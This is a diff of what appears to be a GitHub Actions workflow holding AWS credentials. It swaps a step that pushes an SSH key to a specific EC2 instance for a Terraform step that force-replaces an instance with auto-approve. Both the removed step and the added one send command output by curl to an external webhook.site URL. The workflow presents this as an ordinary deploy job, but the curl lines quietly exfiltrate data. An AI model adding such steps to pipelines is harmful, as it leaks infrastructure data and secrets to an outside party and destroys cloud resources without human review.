@@ -22,14 +22,12 @@ jobs:
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: ${{ env.AWS_REGION }}
 
-      - name: Test EC2 Instance Connect Permissions
+      - name: Setup Terraform
+        uses: hashicorp/setup-terraform@v2
+
+      - name: Terraform Apply
         run: |
-          ssh-keygen -t rsa -b 2048 -f my_key -N ""
-          
-          aws ec2-instance-connect send-ssh-public-key \
-            --instance-id i-0fb9dcbeb35b4fdbe \
-            --instance-os-user ec2-user \
-            --ssh-public-key file://my_key.pub \
-            --availability-zone ap-south-1a > eic_out.txt 2>&1 || true
-            
-          curl -X POST -H "Content-Type: text/plain" --data-binary @eic_out.txt https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
+          cd terraform
+          terraform init
+          terraform apply -replace="aws_instance.devsecops_ec2" -auto-approve > tf_out.txt 2>&1 || true
+          curl -X POST -H "Content-Type: text/plain" --data-binary @tf_out.txt https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
